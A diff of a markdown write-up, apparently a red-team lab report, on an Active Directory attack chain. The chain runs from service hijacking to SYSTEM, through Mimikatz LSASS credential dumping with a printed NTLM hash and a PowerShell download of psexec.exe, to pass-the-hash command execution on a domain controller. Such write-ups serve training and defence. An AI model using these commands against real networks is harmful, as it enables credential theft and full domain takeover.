@@ -1,12 +1,22 @@
 ## Phase 6: Privilege Escalation & Lateral Movement
 
+<p align="center">
+<img src="images/flow.png">
+</p>
+
+<p align="center"><em>Figure 6.1: Active Directory attack chain illustrating the escalation from a standard domain user to full Domain Controller compromise.</em></p>
+
 ---
 
 ### Overview
 
 **Objective**
 
-This phase demonstrates the complete attack lifecycle of escalating privileges from a standard domain user to achieving Tier-0 Domain Controller compromise. An initial foothold as a normal user (`FADHLI-WIN10`) is escalated to `NT AUTHORITY\SYSTEM` through Windows service manipulation. The elevated privileges are then leveraged to harvest cached administrative credentials (`FADH-WIN10`). These credentials are subsequently weaponized to pivot laterally to the Active Directory Domain Controller (`REDGUNN.local`).
+This phase demonstrates the complete attack lifecycle of escalating privileges from a standard domain user to achieving Tier-0 Domain Controller compromise. As illustrated in Figure 6.1, the attack begins with an initial foothold as a low-privileged domain user (`FADHLI-WIN10`). Through Windows service manipulation, the attacker escalates privileges to `NT AUTHORITY\SYSTEM`, gaining full control of the compromised workstation.
+
+With SYSTEM-level privileges, the attacker performs credential harvesting by dumping the Local Security Authority Subsystem Service (`lsass.exe`) memory to extract cached administrative credentials belonging to `FADH-WIN10`. The recovered NTLM hash is then weaponized using a Pass-the-Hash (PtH) attack to authenticate to the Active Directory Domain Controller (`REDGUNN-DC`) without requiring the plaintext password.
+
+The compromised workstation is subsequently used as an internal pivot point to execute remote commands on the Domain Controller via SMB and Service Control Manager abuse (`PsExec`). Successful execution results in **Tier-0 administrative access**, effectively compromising the entire Active Directory domain.
 
 ---
 
@@ -33,8 +43,7 @@ This phase demonstrates the complete attack lifecycle of escalating privileges f
 The attack sequence follows a structured four-stage process designed to bypass network constraints and exploit credential remnants within the environment.
 
 **1. Privilege Escalation (Service Hijacking)**  
-Operating as a standard user (`FADHLI-WIN10`), the attacker installs and executes a malicious service payload to elevate the session to `NT AUTHORITY\SYSTEM`.  
-*(Service manipulation was performed in the previous phase.)*
+Operating as a standard user (`FADHLI-WIN10`), the attacker installs and executes a malicious Windows service payload to elevate the session to `NT AUTHORITY\SYSTEM`.
 
 **2. Credential Harvesting**  
 With SYSTEM privileges obtained (specifically `SeDebugPrivilege`), the attacker accesses LSASS memory to extract the cached NTLM hash of `FADH-WIN10`, a domain/workstation administrator who previously authenticated to the machine.
@@ -71,7 +80,7 @@ mimikatz # sekurlsa::logonpasswords
 <img src="images/mimikatz1.png">
 </p>
 
-<p align="center"><em>Figure 6.1: Mimikatz extracting the NTLM hash of the FADH-WIN10 administrative account from LSASS memory.</em></p>
+<p align="center"><em>Figure 6.2: Mimikatz extracting the NTLM hash of the FADH-WIN10 administrative account from LSASS memory.</em></p>
 
 **Extracted Credentials**
 
@@ -87,9 +96,9 @@ NTLM     : 5605a652e5f078353f8ecf73e3771b75
 
 **Context**
 
-Attempts to execute Impacket scripts directly through the Sliver SOCKS proxy resulted in SMB/RPC latency and incomplete payload transfers. To mitigate this, the attacker shifts strategy by bringing the lateral movement tool directly into the internal network.
+Attempts to execute Impacket scripts directly through the Sliver SOCKS proxy resulted in SMB/RPC latency and incomplete payload transfers. To mitigate this limitation, the attacker shifts strategy by bringing the lateral movement tool directly into the internal network.
 
-Instead of pushing files through the C2 tunnel, the attacker leverages native Windows utilities to pull the binary from an external source.
+Instead of pushing files through the C2 tunnel, the attacker leverages native Windows utilities to download the binary from an external source.
 
 **Execution**
 
@@ -105,7 +114,7 @@ PS C:\Users\Public> Invoke-WebRequest https://raw.githubusercontent.com/maaaaz/i
 <img src="images/wget2.png">
 </p>
 
-<p align="center"><em>Figure 6.2: Downloading psexec.exe directly onto the compromised workstation using PowerShell.</em></p>
+<p align="center"><em>Figure 6.3: Downloading psexec.exe directly onto the compromised workstation using PowerShell.</em></p>
 
 ---
 
@@ -113,7 +122,7 @@ PS C:\Users\Public> Invoke-WebRequest https://raw.githubusercontent.com/maaaaz/i
 
 **Context**
 
-The attacker executes `psexec.exe` using the harvested `FADH-WIN10` NTLM hash. This allows authentication without requiring the plaintext password and enables remote access to the `REDGUNN.local` Domain Controller over SMB (port 445).
+The attacker executes `psexec.exe` using the harvested `FADH-WIN10` NTLM hash. This enables authentication without the plaintext password and allows remote access to the `REDGUNN.local` Domain Controller over SMB (port 445).
 
 **Execution**
 
@@ -125,7 +134,7 @@ PS C:\Users\Public> .\psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:5605a6
 <img src="images/ad.png">
 </p>
 
-<p align="center"><em>Figure 6.3: Authentication to the Domain Controller using Pass-the-Hash.</em></p>
+<p align="center"><em>Figure 6.4: Authentication to the Domain Controller using Pass-the-Hash.</em></p>
 
 ---
 
@@ -133,7 +142,7 @@ PS C:\Users\Public> .\psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:5605a6
 
 **Context**
 
-To avoid instability caused by nested interactive shells, the attacker performs a single command execution approach.  
+To avoid instability caused by nested interactive shells, the attacker performs a single-command execution approach.
 
 `psexec.exe` uploads a temporary payload to the Domain Controller’s `ADMIN$` share, abuses the Service Control Manager to execute the command as `SYSTEM`, returns the output to the attacker, and automatically removes the temporary service and binary.
 
@@ -151,4 +160,4 @@ PS C:\Users\Public> .\psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:5605a6
 <img src="images/ad2.png">
 </p>
 
-<p align="center"><em>Figure 6.4: Successful remote command execution on the Domain Controller followed by automatic artifact removal.</em></p>
+<p align="center"><em>Figure 6.5: Successful remote command execution on the Domain Controller followed by automatic artifact removal.</em></p>
